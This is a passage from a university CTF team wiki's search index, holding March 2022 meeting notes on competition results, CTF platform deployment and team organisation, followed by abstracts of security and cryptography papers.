cores and 16 GB of memory. The access of VPS is open to the public network. In order to deploy in my VPS, we need to assign an SSL certification and allocate a domain name service to the docker image. B. use COMPASS server. The COMPASS server is very high performance. To use the COMPASS's Detroit server, we can directly use the compass.sustech.edu.cn domain name. But the access is limited to the campus. If we want to let users outside the SUSTech access, we need to deploy a jump service. We need to assign the maintenance of the CTF platform to our members. If you are interested, please let me know. The work of the maintenance involves: make sure the platform is online and the docker image is working properly. make sure all the challenge container is online. analysis of the network traffic logs to prevent attackers. Wiki The Wiki page is critical for our public information. We have updated our Wiki page several times. https://wiki.compass.college/member/ On the members' page, we have all of our members' cards. Currently, all the members' information is using our Wechat profile and the area is set to ALL . Obviously, we need to update this page. Please send me your area. Competition https://mp.weixin.qq.com/s?__biz=Mzg5NTc0ODE4Ng==&mid=2247483653&idx=1&sn=8f2f74843dd5eff531be187823d9fc90&chksm=c00ad030f77d5926157929aee64fab31ead3b2b727777633a567a1dc5a579dd3f8a61d603435&mpshare=1&scene=23&srcid=0302kUF13DdLm2lLcV7DCIqL&sharer_sharetime=1646213771898&sharer_shareid=612cf76d62ce2a19afbb97fe3bdd60a8#rd https://www.qianxin.com/DCICHF/2022 Note [ ] \u62a4\u7f51\u884c\u52a8\u7533\u8bf7\u76f8\u5173\uff0c\u8fdb\u884c\u8054\u7edc\u3002 [x] Wiki\u7684\u8054\u7edc\u65b9\u5f0f\u6dfb\u52a0\uff0c\u5468\u56db\u4f1a\u8bae\u7684link\u94fe\u63a5\u3002 [x] Wiki\u7684meeting notes\u653e\u5728\u66f4\u663e\u773c\u7684\u5730\u65b9\u3002 [ ] \u5bf9\u5916\u5ba3\u4f20\u7684\u5de5\u4f5c\u3002","title":"CTF Week Meeting 2022-03-03"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-03/#ctf-week-meeting-2022-03-03","text":"Review of the recent competitions. COMPASS CTF platform has moved back to VPS. Wiki page update and maintenance. Competition of the weekend.","title":"CTF Week Meeting 2022-03-03"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-03/#competition-review","text":"","title":"Competition Review"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-03/#codegate-2022","text":"We have achieved rank 29. The rank is in the top tier 2 list. The top 20 teams are very famous organizers , r3kpig , DiceGang , Oops , and perfect blue . Our rank is along with Super Guesser . In the meanwhile, we have won Redbud for continuous 3 times. Still, we have some areas to improve. First of all, all of our scores are from the Web category. PWN is still an area we should improve. The Rev and Crypto of the codegate are very difficult.","title":"CODEGATE 2022"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-03/#ctfshow","text":"Congratulations to Frankss! Looking forward to your next rank 1 in CTF!","title":"CTFshow"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-03/#ctf-platform","text":"In the past very long time, we use CTFd online collocation system to deploy our platform. The CTFd online service is limited now. The black box of CTFd doesn't offer us direct interaction with the source code and the plugins. In order to make further improvements, we are going to switch back to the local VPS deployment. We have 2 plans: A. use my personal VPS server. The VPS is in Hong Kong with 8 CPU cores and 16 GB of memory. The access of VPS is open to the public network. In order to deploy in my VPS, we need to assign an SSL certification and allocate a domain name service to the docker image. B. use COMPASS server. The COMPASS server is very high performance. To use the COMPASS's Detroit server, we can directly use the compass.sustech.edu.cn domain name. But the access is limited to the campus. If we want to let users outside the SUSTech access, we need to deploy a jump service. We need to assign the maintenance of the CTF platform to our members. If you are interested, please let me know. The work of the maintenance involves: make sure the platform is online and the docker image is working properly. make sure all the challenge container is online. analysis of the network traffic logs to prevent attackers.","title":"CTF Platform"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-03/#wiki","text":"The Wiki page is critical for our public information. We have updated our Wiki page several times. https://wiki.compass.college/member/ On the members' page, we have all of our members' cards. Currently, all the members' information is using our Wechat profile and the area is set to ALL . Obviously, we need to update this page. Please send me your area.","title":"Wiki"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-03/#competition","text":"https://mp.weixin.qq.com/s?__biz=Mzg5NTc0ODE4Ng==&mid=2247483653&idx=1&sn=8f2f74843dd5eff531be187823d9fc90&chksm=c00ad030f77d5926157929aee64fab31ead3b2b727777633a567a1dc5a579dd3f8a61d603435&mpshare=1&scene=23&srcid=0302kUF13DdLm2lLcV7DCIqL&sharer_sharetime=1646213771898&sharer_shareid=612cf76d62ce2a19afbb97fe3bdd60a8#rd https://www.qianxin.com/DCICHF/2022","title":"Competition"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-03/#note","text":"[ ] \u62a4\u7f51\u884c\u52a8\u7533\u8bf7\u76f8\u5173\uff0c\u8fdb\u884c\u8054\u7edc\u3002 [x] Wiki\u7684\u8054\u7edc\u65b9\u5f0f\u6dfb\u52a0\uff0c\u5468\u56db\u4f1a\u8bae\u7684link\u94fe\u63a5\u3002 [x] Wiki\u7684meeting notes\u653e\u5728\u66f4\u663e\u773c\u7684\u5730\u65b9\u3002 [ ] \u5bf9\u5916\u5ba3\u4f20\u7684\u5de5\u4f5c\u3002","title":"Note"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-10/","text":"CTF Week Meeting 2022-03-10 Review of the recent competitions. Review of the recent works. Course from the SU team. Competition event for this week. Drunk too much coffee. Competition Review You may notice the awards we've got have been pushed to the wiki. We have participated in the eCTF for practice last week. Challenge solving process: Forensics 3 / 8 Crypto 3 / 8 Misc 5 / 5 AK RE-pwn 4 / 5 OSINT 1 / 8 (Oh God...) Web 3 / 3 AK Easy peasy 2 /2 AK The challenges quality is on average. Project Review I've started too many projects in the recent meetings... Daily Article Bot The project aims to publish news, blogs, and writeups from personal websites. Going to follow the steps: Catch several websites. Telegram bot. Mail subscribe link. I have created the Rust project for the Telegram bot using the following template: https://github.com/telegram-rs/telegram-bot The function would be done soon. If you are interested in the Mail subscribe service's development, please let me know. Platform Thanks to the very brief description of the installing instruction, deploying ctfd-whale is hard. [x] Move all the data to the local machine. [ ] Establish ctfd-whale. [ ] Package all the challenges to the docker image. [x] Establish SSL certification. I'll find it out these days. Research Related Do you remember the Chaff Bug? https://wiki.compass.college/Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/ In brief: the Chaff is an idea to create hundreds of fake buffer overflow points. The work of the attackers is increased by non-vulnerable bugs. However, SCA (Source Code Analysis), concolic analysis, and Fuzzing can solve this problem. The PWN challenges from CTF can also be solved by the concolic analysis. The famous angr is often used to do the job. https://angr.io/ We also know the CGC (Cyber Grand Challenge) is major in automated software analysis. A survey of the Cyber Reasoning System: https://ieeexplore.ieee.org/abstract/document/8411838 I'm going to summarize the research on CRS and SCA. Wiki Contact I've added the contact email address to Wiki. As well as the weekly meeting address. https://wiki.compass.college/ Learn from SU Team It's all from an article forwarded by Frankss. https://team-su.github.io/ SU team has achieved the top rank in SUSCTF 2022. SU team is a united team of members in the universities (we are a university team with all of us from SUSTech). SU team is established in 2016, and be famous in 2022. The cooperation experience from SU: Collaborate with the university club. Communication with members, teachers from other teams. An experienced member leads a new member. Layer management: each orientation has an admin. Each member concentration on the specific orientation. Reduce the pigeons. Solving the challenges with a girlfriend. I've pm each member to confirm the major orientation. The communication with the SU team is in the progress. Hopefully, we would talk with them in the future. Competition The 1337UP live CTF (Jeopardy, dynamic score from 500 to 50) The team size is 4. https://ctf.intigriti.io/ \u661f\u671f\u4e94, 11 \u4e09\u6708 2022, 23:00 CST \u2014 \u661f\u671f\u516d, 12 \u4e09\u6708 2022, 23:00 CST The top 3 teams would get cash awards. The top 10 teams would receive some 1337UP swag. The top 100 teams would receive a souvenir certificate, and an increased chance to be invited to the private program of the Intigriti. This is the first 1337UP CTF. The organizer: Intigriti (Europe's #1 ethical hacking and bug bounty platform) Drunk too much coffee Take care of yourself. Doing some exercise can be helpful. I hope COVID-19 will end soon. Note [x] \u8fdb\u5c55\u7acb\u5373\u53cd\u9988\uff0c\u5468\u4f1a\u8fdb\u884c\u603b\u7ed3 [x] notion\u6a21\u677f\u7684\u6539\u52a8\uff0c\u6bd4\u8d5b\u8d1f\u8d23\u4eba","title":"CTF Week Meeting 2022-03-10"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-10/#ctf-week-meeting-2022-03-10","text":"Review of the recent competitions. Review of the recent works. Course from the SU team. Competition event for this week. Drunk too much coffee.","title":"CTF Week Meeting 2022-03-10"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-10/#competition-review","text":"You may notice the awards we've got have been pushed to the wiki. We have participated in the eCTF for practice last week. Challenge solving process: Forensics 3 / 8 Crypto 3 / 8 Misc 5 / 5 AK RE-pwn 4 / 5 OSINT 1 / 8 (Oh God...) Web 3 / 3 AK Easy peasy 2 /2 AK The challenges quality is on average.","title":"Competition Review"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-10/#project-review","text":"I've started too many projects in the recent meetings...","title":"Project Review"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-10/#daily-article-bot","text":"The project aims to publish news, blogs, and writeups from personal websites. Going to follow the steps: Catch several websites. Telegram bot. Mail subscribe link. I have created the Rust project for the Telegram bot using the following template: https://github.com/telegram-rs/telegram-bot The function would be done soon. If you are interested in the Mail subscribe service's development, please let me know.","title":"Daily Article Bot"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-10/#platform","text":"Thanks to the very brief description of the installing instruction, deploying ctfd-whale is hard. [x] Move all the data to the local machine. [ ] Establish ctfd-whale. [ ] Package all the challenges to the docker image. [x] Establish SSL certification. I'll find it out these days.","title":"Platform"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-10/#research-related","text":"Do you remember the Chaff Bug? https://wiki.compass.college/Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/ In brief: the Chaff is an idea to create hundreds of fake buffer overflow points. The work of the attackers is increased by non-vulnerable bugs. However, SCA (Source Code Analysis), concolic analysis, and Fuzzing can solve this problem. The PWN challenges from CTF can also be solved by the concolic analysis. The famous angr is often used to do the job. https://angr.io/ We also know the CGC (Cyber Grand Challenge) is major in automated software analysis. A survey of the Cyber Reasoning System: https://ieeexplore.ieee.org/abstract/document/8411838 I'm going to summarize the research on CRS and SCA.","title":"Research Related"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-10/#wiki-contact","text":"I've added the contact email address to Wiki. As well as the weekly meeting address. https://wiki.compass.college/","title":"Wiki Contact"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-10/#learn-from-su-team","text":"It's all from an article forwarded by Frankss. https://team-su.github.io/ SU team has achieved the top rank in SUSCTF 2022. SU team is a united team of members in the universities (we are a university team with all of us from SUSTech). SU team is established in 2016, and be famous in 2022. The cooperation experience from SU: Collaborate with the university club. Communication with members, teachers from other teams. An experienced member leads a new member. Layer management: each orientation has an admin. Each member concentration on the specific orientation. Reduce the pigeons. Solving the challenges with a girlfriend. I've pm each member to confirm the major orientation. The communication with the SU team is in the progress. Hopefully, we would talk with them in the future.","title":"Learn from SU Team"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-10/#competition","text":"The 1337UP live CTF (Jeopardy, dynamic score from 500 to 50) The team size is 4. https://ctf.intigriti.io/ \u661f\u671f\u4e94, 11 \u4e09\u6708 2022, 23:00 CST \u2014 \u661f\u671f\u516d, 12 \u4e09\u6708 2022, 23:00 CST The top 3 teams would get cash awards. The top 10 teams would receive some 1337UP swag. The top 100 teams would receive a souvenir certificate, and an increased chance to be invited to the private program of the Intigriti. This is the first 1337UP CTF. The organizer: Intigriti (Europe's #1 ethical hacking and bug bounty platform)","title":"Competition"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-10/#drunk-too-much-coffee","text":"Take care of yourself. Doing some exercise can be helpful. I hope COVID-19 will end soon.","title":"Drunk too much coffee"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-10/#note","text":"[x] \u8fdb\u5c55\u7acb\u5373\u53cd\u9988\uff0c\u5468\u4f1a\u8fdb\u884c\u603b\u7ed3 [x] notion\u6a21\u677f\u7684\u6539\u52a8\uff0c\u6bd4\u8d5b\u8d1f\u8d23\u4eba","title":"Note"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-17/","text":"CTF Week Meeting 2022-03-17 Competition schedule. CTF Platform dynamic container. Competition management. Competition Schedule 2022\u6570\u5b57\u4e2d\u56fd\u521b\u65b0\u5927\u8d5b\u864e\u7b26\u7f51\u7edc\u5b89\u5168\u8d5b\u9053 \u65f6\u95f4\uff1a2022-03-19 09:00 ~ 2022-03-20 17:00 https://datacon.qianxin.com/competitions/22/introduction \u664b\u7ea7\u8d44\u683c\uff1a\u521d\u8d5b\u6210\u7ee9\u6392\u540d\u524d35\u7684\u961f\u4f0d\uff08\u7ebf\u4e0a\u521d\u8d5b\u6210\u7ee9\u6392\u540d\u524d20\u7684\u9ad8\u6821\u6218\u961f+\u7ebf\u4e0a\u521d\u8d5b\u6210\u7ee9\u6392\u540d\u524d15\u7684\u884c\u4e1a\u6218\u961f\uff09\u8fdb\u5165\u51b3\u8d5b\uff0c\u540c\u4e00\u96c6\u56e2\u5355\u4f4d\u3001\u9ad8\u6821\u6700\u591a\u53ea\u80fd\u5165\u56f42\u652f\u6218\u961f\uff0c\u6bcf\u961f\u4e0d\u8d85\u8fc74\u4eba\uff0c\u53ca\u4e00\u540d\u9886\u961f\uff0c\u51b3\u8d5b\u524d\u961f\u5458\u53ef\u66f4\u6362\uff0c\u4f46\u8981\u6c42\u53c2\u8d5b\u9009\u624b\u9700\u662f\u521d\u8d5b\u62a5\u540d\u4eba\u5458\uff0c\u5e76\u4e14\u5fc5\u987b\u6765\u81ea\u540c\u4e00\u96c6\u56e2\u5355\u4f4d\u6216\u9ad8\u6821\uff0c\u8fdb\u5165\u603b\u51b3\u8d5b\u5355\u4f4d/\u884c\u4e1a\u6218\u961f\u9700\u63d0\u4f9b\u534a\u5e74\u4ee5\u4e0a\u7684\u672c\u5355\u4f4d\u793e\u4fdd\u8bc1\u660e\uff0c\u5404\u9ad8\u6821\u6218\u961f\u9700\u63d0\u4f9b\u52a0\u76d6\u6240\u5728\u540c\u4e00\u9ad8\u6821\u516c\u7ae0\u7684\u5728\u8bfb\u8bc1\u660e\uff0c\u5982\u53d1\u73b0\u4efb\u4f55\u4f5c\u5f0a\u3001\u4ee3\u6253\u884c\u4e3a\uff0c\u5c06\u76f4\u63a5\u53d6\u6d88\u6bd4\u8d5b\u8d44\u683c\u5e76\u8fdb\u884c\u516c\u544a\u3002 Misc: \u5468\u7ff0\u7136\u3001\u9648\u6893\u6db5\u3001\u5deb\u6653\u3001\u6731\u5609\u6960 Web: \u91d1\u8087\u8f69\u3001\u4e25\u6587\u8c26 Re: \u90ac\u4e00\u5e06\u3001\u6731\u5f18 PWN: \u674e\u7167\u3001\u90ac\u4e00\u5e06 Crypto: \u6731\u5609\u6960\u3001\u5468\u7ff0\u7136\u3001\u4e25\u6587\u8c26 \u9898\u76ee\u6574\u7406 & \u540c\u6b65\uff1a\u90ac\u4e00\u5e06\u3001\u674e\u7167 CTFd Dynamic Container Current solution: https://github.com/frankli0324/ctfd-whale/ The dependency frp is vulnerable to SSRF in the history (and very likely now), and have been bypassed several times. Should we still deploy on the COMPASS server? The local deployment is successful and ready to use, but we may have a better alternative. Competition Management For each competition, we would have an administrator. The admin has the following tasks: Synchronize the challenges to the Notion. Collect the writeups after the competition. The competitions would use Notion to update. Contact @Frankss to be invited. The competitions would use Discord to chat. Note [ ] \u5e73\u53f0\u5206\u5e03\u90e8\u7f72\uff0c\u5bb9\u5668\u653e\u5728\u6821\u5916","title":"CTF Week Meeting 2022-03-17"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-17/#ctf-week-meeting-2022-03-17","text":"Competition schedule. CTF Platform dynamic container. Competition management.","title":"CTF Week Meeting 2022-03-17"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-17/#competition-schedule","text":"2022\u6570\u5b57\u4e2d\u56fd\u521b\u65b0\u5927\u8d5b\u864e\u7b26\u7f51\u7edc\u5b89\u5168\u8d5b\u9053 \u65f6\u95f4\uff1a2022-03-19 09:00 ~ 2022-03-20 17:00 https://datacon.qianxin.com/competitions/22/introduction \u664b\u7ea7\u8d44\u683c\uff1a\u521d\u8d5b\u6210\u7ee9\u6392\u540d\u524d35\u7684\u961f\u4f0d\uff08\u7ebf\u4e0a\u521d\u8d5b\u6210\u7ee9\u6392\u540d\u524d20\u7684\u9ad8\u6821\u6218\u961f+\u7ebf\u4e0a\u521d\u8d5b\u6210\u7ee9\u6392\u540d\u524d15\u7684\u884c\u4e1a\u6218\u961f\uff09\u8fdb\u5165\u51b3\u8d5b\uff0c\u540c\u4e00\u96c6\u56e2\u5355\u4f4d\u3001\u9ad8\u6821\u6700\u591a\u53ea\u80fd\u5165\u56f42\u652f\u6218\u961f\uff0c\u6bcf\u961f\u4e0d\u8d85\u8fc74\u4eba\uff0c\u53ca\u4e00\u540d\u9886\u961f\uff0c\u51b3\u8d5b\u524d\u961f\u5458\u53ef\u66f4\u6362\uff0c\u4f46\u8981\u6c42\u53c2\u8d5b\u9009\u624b\u9700\u662f\u521d\u8d5b\u62a5\u540d\u4eba\u5458\uff0c\u5e76\u4e14\u5fc5\u987b\u6765\u81ea\u540c\u4e00\u96c6\u56e2\u5355\u4f4d\u6216\u9ad8\u6821\uff0c\u8fdb\u5165\u603b\u51b3\u8d5b\u5355\u4f4d/\u884c\u4e1a\u6218\u961f\u9700\u63d0\u4f9b\u534a\u5e74\u4ee5\u4e0a\u7684\u672c\u5355\u4f4d\u793e\u4fdd\u8bc1\u660e\uff0c\u5404\u9ad8\u6821\u6218\u961f\u9700\u63d0\u4f9b\u52a0\u76d6\u6240\u5728\u540c\u4e00\u9ad8\u6821\u516c\u7ae0\u7684\u5728\u8bfb\u8bc1\u660e\uff0c\u5982\u53d1\u73b0\u4efb\u4f55\u4f5c\u5f0a\u3001\u4ee3\u6253\u884c\u4e3a\uff0c\u5c06\u76f4\u63a5\u53d6\u6d88\u6bd4\u8d5b\u8d44\u683c\u5e76\u8fdb\u884c\u516c\u544a\u3002 Misc: \u5468\u7ff0\u7136\u3001\u9648\u6893\u6db5\u3001\u5deb\u6653\u3001\u6731\u5609\u6960 Web: \u91d1\u8087\u8f69\u3001\u4e25\u6587\u8c26 Re: \u90ac\u4e00\u5e06\u3001\u6731\u5f18 PWN: \u674e\u7167\u3001\u90ac\u4e00\u5e06 Crypto: \u6731\u5609\u6960\u3001\u5468\u7ff0\u7136\u3001\u4e25\u6587\u8c26 \u9898\u76ee\u6574\u7406 & \u540c\u6b65\uff1a\u90ac\u4e00\u5e06\u3001\u674e\u7167","title":"Competition Schedule"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-17/#ctfd-dynamic-container","text":"Current solution: https://github.com/frankli0324/ctfd-whale/ The dependency frp is vulnerable to SSRF in the history (and very likely now), and have been bypassed several times. Should we still deploy on the COMPASS server? The local deployment is successful and ready to use, but we may have a better alternative.","title":"CTFd Dynamic Container"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-17/#competition-management","text":"For each competition, we would have an administrator. The admin has the following tasks: Synchronize the challenges to the Notion. Collect the writeups after the competition. The competitions would use Notion to update. Contact @Frankss to be invited. The competitions would use Discord to chat.","title":"Competition Management"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-17/#note","text":"[ ] \u5e73\u53f0\u5206\u5e03\u90e8\u7f72\uff0c\u5bb9\u5668\u653e\u5728\u6821\u5916","title":"Note"},{"location":"Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/","text":"Cert-RNN: Towards Certifying the Robustness of Recurrent Neural Networks Authors: Tianyu Du (Zhejiang University); Shouling Ji (Zhejiang University); Lujia Shen (Zhejiang University); Yao Zhang (Zhejiang University); Jinfeng Li (Zhejiang University); Jie Shi (Huawei International, Singapore); Chengfang Fang (Huawei International, Singapore); Jianwei Yin (Zhejiang University); Raheem Beyah (Georgia Institute of Technology); Ting Wang (Pennsylvania State University) Keywords: deep learning, recurrent neural networks, robustness certification, natural language processing Abstract Certifiable robustness, the functionality of verifying whether the given region surrounding a data point admits any adversarial example, provides guaranteed security for neural networks deployed in adversarial environments. A plethora of work has been proposed to certify the robustness of feed-forward networks, e.g., FCNs and CNNs. Yet, most existing methods cannot be directly applied to recurrent neural networks (RNNs), due to their sequential inputs and unique operations. In this paper, we present Cert-RNN, a general framework for certifying the robustness of RNNs. Specifically, through detailed analysis for the intrinsic property of the unique function in different ranges, we exhaustively discuss different cases for the exact formula of bounding planes, based on which we design several precise and efficient abstract transformers for the unique calculations in RNNs. Cert-RNN significantly outperforms the state-of-the-art methods (e.g., POPQORN [25]) in terms of (i) effectiveness \u2013 it provides much tighter robustness bounds, and (ii) efficiency \u2013 it scales to much more complex models. Through extensive evaluation, we validate Cert-RNN\u2019s superior performance across various network architectures (e.g., vanilla RNN and LSTM) and applications (e.g., image classification, sentiment analysis, toxic comment detection, and malicious URL detection). For instance, for the RNN-2-32 model on the MNIST sequence dataset, the robustness bound certified by Cert-RNN is on average 1.86 times larger than that by POPQORN. Besides certifying the robustness of given RNNs, Cert-RNN also enables a range of practical applications including evaluating the provable effectiveness for various defenses (i.e., the defense with a larger robustness region is considered to be more robust), improving the robustness of RNNs (i.e., incorporating Cert-RNN with verified robust training) and identifying sensitive words (i.e., the word with the smallest certified robustness bound is considered to be the most sensitive word in a sentence), which helps build more robust and interpretable deep learning systems. We will open-source CertRNN for facilitating the DNN security research. Related Present PPT: https://nesa.zju.edu.cn/download/ppt/dty_slides_Cert-RNN.pdf Download PDF: Cert-RNN Towards Certifying the Robustness of Recurrent.pdf","title":"Cert-RNN: Towards Certifying the Robustness of Recurrent Neural Networks"},{"location":"Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/#cert-rnn-towards-certifying-the-robustness-of-recurrent-neural-networks","text":"Authors: Tianyu Du (Zhejiang University); Shouling Ji (Zhejiang University); Lujia Shen (Zhejiang University); Yao Zhang (Zhejiang University); Jinfeng Li (Zhejiang University); Jie Shi (Huawei International, Singapore); Chengfang Fang (Huawei International, Singapore); Jianwei Yin (Zhejiang University); Raheem Beyah (Georgia Institute of Technology); Ting Wang (Pennsylvania State University) Keywords: deep learning, recurrent neural networks, robustness certification, natural language processing","title":"Cert-RNN: Towards Certifying the Robustness of Recurrent Neural Networks"},{"location":"Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/#abstract","text":"Certifiable robustness, the functionality of verifying whether the given region surrounding a data point admits any adversarial example, provides guaranteed security for neural networks deployed in adversarial environments. A plethora of work has been proposed to certify the robustness of feed-forward networks, e.g., FCNs and CNNs. Yet, most existing methods cannot be directly applied to recurrent neural networks (RNNs), due to their sequential inputs and unique operations. In this paper, we present Cert-RNN, a general framework for certifying the robustness of RNNs. Specifically, through detailed analysis for the intrinsic property of the unique function in different ranges, we exhaustively discuss different cases for the exact formula of bounding planes, based on which we design several precise and efficient abstract transformers for the unique calculations in RNNs. Cert-RNN significantly outperforms the state-of-the-art methods (e.g., POPQORN [25]) in terms of (i) effectiveness \u2013 it provides much tighter robustness bounds, and (ii) efficiency \u2013 it scales to much more complex models. Through extensive evaluation, we validate Cert-RNN\u2019s superior performance across various network architectures (e.g., vanilla RNN and LSTM) and applications (e.g., image classification, sentiment analysis, toxic comment detection, and malicious URL detection). For instance, for the RNN-2-32 model on the MNIST sequence dataset, the robustness bound certified by Cert-RNN is on average 1.86 times larger than that by POPQORN. Besides certifying the robustness of given RNNs, Cert-RNN also enables a range of practical applications including evaluating the provable effectiveness for various defenses (i.e., the defense with a larger robustness region is considered to be more robust), improving the robustness of RNNs (i.e., incorporating Cert-RNN with verified robust training) and identifying sensitive words (i.e., the word with the smallest certified robustness bound is considered to be the most sensitive word in a sentence), which helps build more robust and interpretable deep learning systems. We will open-source CertRNN for facilitating the DNN security research.","title":"Abstract"},{"location":"Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/#related","text":"Present PPT: https://nesa.zju.edu.cn/download/ppt/dty_slides_Cert-RNN.pdf","title":"Related"},{"location":"Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/#download","text":"PDF: Cert-RNN Towards Certifying the Robustness of Recurrent.pdf","title":"Download"},{"location":"Paper/Artificial%20Intelligence/Unleashing%20the%20Tiger%20Inference%20Attacks%20on%20Split%20Learning/","text":"Unleashing the Tiger Inference Attacks on Split Learning [Submitted on 4 Dec 2020 ( v1 ), last revised 21 Aug 2021 (this version, v4)] Authors: Dario Pasquini , Giuseppe Ateniese , Massimo Bernaschi Comments: To appear in the proceedings of: ACM Conference on Computer and Communications Security 2021 (CCS21) Subjects: Cryptography and Security (cs.CR); Machine Learning (cs.LG) Abstract We investigate the security of Split Learning -- a novel collaborative machine learning framework that enables peak performance by requiring minimal resources consumption. In the present paper, we expose vulnerabilities of the protocol and demonstrate its inherent insecurity by introducing general attack strategies targeting the reconstruction of clients' private training sets. More prominently, we show that a malicious server can actively hijack the learning process of the distributed model and bring it into an insecure state that enables inference attacks on clients' data. We implement different adaptations of the attack and test them on various datasets as well as within realistic threat scenarios. We demonstrate that our attack is able to overcome recently proposed defensive techniques aimed at enhancing the security of the split learning protocol. Finally, we also illustrate the protocol's insecurity against malicious clients by extending previously devised attacks for Federated Learning. To make our results reproducible, we made our code available at this https URL . Related GitHub repo: https://github.com/pasquini-dario/SplitNN_FSHA Download PDF: Unleashing the Tiger Inference Attacks on Split Learning.pdf","title":"Unleashing the Tiger Inference Attacks on Split Learning"},{"location":"Paper/Artificial%20Intelligence/Unleashing%20the%20Tiger%20Inference%20Attacks%20on%20Split%20Learning/#unleashing-the-tiger-inference-attacks-on-split-learning","text":"[Submitted on 4 Dec 2020 ( v1 ), last revised 21 Aug 2021 (this version, v4)] Authors: Dario Pasquini , Giuseppe Ateniese , Massimo Bernaschi Comments: To appear in the proceedings of: ACM Conference on Computer and Communications Security 2021 (CCS21) Subjects: Cryptography and Security (cs.CR); Machine Learning (cs.LG)","title":"Unleashing the Tiger Inference Attacks on Split Learning"},{"location":"Paper/Artificial%20Intelligence/Unleashing%20the%20Tiger%20Inference%20Attacks%20on%20Split%20Learning/#abstract","text":"We investigate the security of Split Learning -- a novel collaborative machine learning framework that enables peak performance by requiring minimal resources consumption. In the present paper, we expose vulnerabilities of the protocol and demonstrate its inherent insecurity by introducing general attack strategies targeting the reconstruction of clients' private training sets. More prominently, we show that a malicious server can actively hijack the learning process of the distributed model and bring it into an insecure state that enables inference attacks on clients' data. We implement different adaptations of the attack and test them on various datasets as well as within realistic threat scenarios. We demonstrate that our attack is able to overcome recently proposed defensive techniques aimed at enhancing the security of the split learning protocol. Finally, we also illustrate the protocol's insecurity against malicious clients by extending previously devised attacks for Federated Learning. To make our results reproducible, we made our code available at this https URL .","title":"Abstract"},{"location":"Paper/Artificial%20Intelligence/Unleashing%20the%20Tiger%20Inference%20Attacks%20on%20Split%20Learning/#related","text":"GitHub repo: https://github.com/pasquini-dario/SplitNN_FSHA","title":"Related"},{"location":"Paper/Artificial%20Intelligence/Unleashing%20the%20Tiger%20Inference%20Attacks%20on%20Split%20Learning/#download","text":"PDF: Unleashing the Tiger Inference Attacks on Split Learning.pdf","title":"Download"},{"location":"Paper/Cryptography/Fuzzy%20Message%20Detection/","text":"Fuzzy Message Detection Authors: Gabrielle Beck and Julia Len and Ian Miers and Matthew Green Category / Keywords: public-key cryptography / privacy, encryption, cryptocurrency Original Publication (with major differences): ACM CCS Abstract Many privacy-preserving protocols employ a primitive that allows a sender to \"flag\" a message to a recipient's public key, such that only the recipient (who possesses the corresponding secret key) can detect that the message is intended for their use. Examples of such protocols include anonymous messaging, privacy-preserving payments, and anonymous tracing. A limitation of the existing techniques is that recipients cannot easily outsource the detection of messages to a remote server, without revealing to the server the exact set of matching messages. In this work we propose a new class of cryptographic primitives called fuzzy message detection schemes. These schemes allow a recipient to derive a specialized message detection key that can identify correct messages, while also incorrectly identifying non-matching messages with a specific and chosen false positive rate pp. This allows recipients to outsource detection work to an untrustworthy server, without revealing precisely which messages belong to the receiver. We show how to construct these schemes under a variety of assumptions; describe several applications of the new technique; and show that our schemes are efficient enough to use in real applications. Download PDF: Fuzzy Message Detection.pdf","title":"Fuzzy Message Detection"},{"location":"Paper/Cryptography/Fuzzy%20Message%20Detection/#fuzzy-message-detection","text":"Authors: Gabrielle Beck and Julia Len and Ian Miers and Matthew Green Category / Keywords: public-key cryptography / privacy, encryption, cryptocurrency Original Publication (with major differences): ACM CCS","title":"Fuzzy Message Detection"},{"location":"Paper/Cryptography/Fuzzy%20Message%20Detection/#abstract","text":"Many privacy-preserving protocols employ a primitive that allows a sender to \"flag\" a message to a recipient's public key, such that only the recipient (who possesses the corresponding secret key) can detect that the message is intended for their use. Examples of such protocols include anonymous messaging, privacy-preserving payments, and anonymous tracing. A limitation of the existing techniques is that recipients cannot easily outsource the detection of messages to a remote server, without revealing to the server the exact set of matching messages. In this work we propose a new class of cryptographic primitives called fuzzy message detection schemes. These schemes allow a recipient to derive a specialized message detection key that can identify correct messages, while also incorrectly identifying non-matching messages with a specific and chosen false positive rate pp. This allows recipients to outsource detection work to an untrustworthy server, without revealing precisely which messages belong to the receiver. We show how to construct these schemes under a variety of assumptions; describe several applications of the new technique; and show that our schemes are efficient enough to use in real applications.","title":"Abstract"},{"location":"Paper/Cryptography/Fuzzy%20Message%20Detection/#download","text":"PDF: Fuzzy Message 